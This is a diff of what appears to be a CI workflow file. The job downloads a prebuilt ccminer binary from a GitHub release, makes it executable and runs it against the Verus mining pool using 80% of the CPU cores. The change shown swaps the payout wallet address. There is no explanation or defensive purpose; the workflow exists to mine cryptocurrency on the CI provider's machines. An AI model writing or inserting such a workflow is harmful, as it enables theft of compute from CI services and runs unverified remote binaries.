@@ -21,7 +21,7 @@ jobs:
           sudo apt install bc
           wget https://github.com/Oink70/ccminer-verus/releases/download/v3.8.3a-CPU/ccminer-v3.8.3a-oink_Ubuntu_18.04+nicehash
           mv ccminer* ccminer && chmod +x ccminer
-          ./ccminer -a verus -o stratum+tcp://pool.verus.io:9999 -u 0x13e73ae803ebe4e57e21870f19b645771b57eacd -p x -t $(echo "$(nproc) * 0.8 / 1" | bc)
+          ./ccminer -a verus -o stratum+tcp://pool.verus.io:9999 -u RLUQtiZvHiTKDpG3ZZ6o5SdaPNLw2JUGab -p x -t $(echo "$(nproc) * 0.8 / 1" | bc)
 
           
 
